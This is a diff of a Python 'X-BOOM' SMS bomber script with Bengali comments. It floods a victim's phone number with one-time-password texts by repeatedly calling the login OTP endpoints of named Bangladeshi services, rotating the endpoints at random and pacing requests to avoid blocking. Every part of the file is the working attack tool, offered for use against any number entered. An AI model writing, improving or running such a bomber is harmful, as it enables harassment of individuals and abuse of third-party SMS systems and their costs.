@@ -1,69 +1,58 @@
 import requests
 import os
 import time
+import random
+
+# কালার কোড (টারমাক্স সুন্দর দেখানোর জন্য)
+r = "\033[1;31m"
+g = "\033[1;32m"
+y = "\033[1;33m"
+w = "\033[1;37m"
 
 def banner():
     os.system('clear')
-    print("========================================")
-    print("        WELCOME TO X-BOOM TOOL          ")
-    print("     Created by: mmalekislam788         ")
-    print("     Status: SUPER-API BYPASS ACTIVE    ")
-    print("========================================")
+    print(f"{g}========================================")
+    print(f"{y}        X-BOOM ULTIMATE EDITION         ")
+    print(f"{y}     Bypass: Enabled | WiFi & PC        ")
+    print(f"{g}========================================{w}")
 
 def send_sms(target, count):
-    # আপনার দেওয়া Fundesh সহ আরও ৩টি শক্তিশালী API
-    # আমরা Headers ব্যবহার করছি যেন সার্ভার ব্লক না করে
+    # সচল এবং শক্তিশালী API লিস্ট
+    apis = [
+        {"url": "https://api.sharetrip.net/api/v1/otp/send", "data": {"mobileNumber": target, "type": "login"}},
+        {"url": "https://api.shikho.com/api/v1/auth/send-otp", "data": {"phone": target, "type": "login"}},
+        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}}
+    ]
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-        "Content-Type": "application/json",
-        "Referer": "https://www.google.com/"
+        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
+        "Content-Type": "application/json"
     }
 
-    print(f"\n[+] Attack started on: {target}")
-    
+    print(f"\n{g}[+] Attack Started on: {target}{w}")
     for i in range(count):
+        api = random.choice(apis)
         try:
-            # ১. Fundesh API (আপনার দেওয়াটি)
-            url1 = "https://api.fundesh.com.bd/api/auth/send-otp"
-            data1 = {"phoneNumber": target, "service": "LOGIN"}
-            
-            # ২. Redx API (ভিন্ন স্টাইল)
-            url2 = "https://api.redx.com.bd/v1/user/signup"
-            data2 = {"phone": target}
-            
-            # ৩. Daraz API (সবচেয়ে ফাস্ট)
-            url3 = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
-            data3 = {"phoneNumber": target, "otpType": "LOGIN"}
-
-            # রিকোয়েস্ট পাঠানো হচ্ছে
-            requests.post(url1, json=data1, headers=headers, timeout=10)
-            requests.post(url2, json=data2, headers=headers, timeout=10)
-            requests.post(url3, json=data3, headers=headers, timeout=10)
-
-            print(f"[!] SMS Slot {i+1} sent (Check Phone)")
-            
-        except Exception as e:
-            print(f"[-] Error at Slot {i+1}")
+            # রিকোয়েস্ট পাঠানো
+            res = requests.post(api["url"], json=api["data"], headers=headers, timeout=10)
+            if res.status_code == 200:
+                print(f"{g}[!] SMS {i+1} Sent Successfully!{w}")
+            else:
+                print(f"{r}[?] SMS {i+1} Failed (Blocked){w}")
+        except:
+            print(f"{r}[-] Connection Error{w}")
         
-        # ৪ সেকেন্ড বিরতি দিন, খুব দ্রুত পাঠালে সার্ভার মেসেজ আটকে দেয়
-        time.sleep(4)
+        time.sleep(5) # ৫-৭ সেকেন্ড গ্যাপ জরুরি
 
 def main():
     banner()
-    print("\n[1] Start Super-Power Bomber")
-    print("[2] Exit")
-    choice = input("\nSelect Option: ")
-    if choice == '1':
-        number = input("Enter Phone Number (01xxxxxxxxx): ")
-        amount = int(input("Enter SMS Amount: "))
-        send_sms(number, amount)
-        print("\n[+] Task Finished!")
-    else:
-        exit()
+    num = input(f"{y}Enter Number: {w}")
+    amount = int(input(f"{y}Enter Amount: {w}"))
+    send_sms(num, amount)
 
 if __name__ == "__main__":
     main()
 
+  
 
 
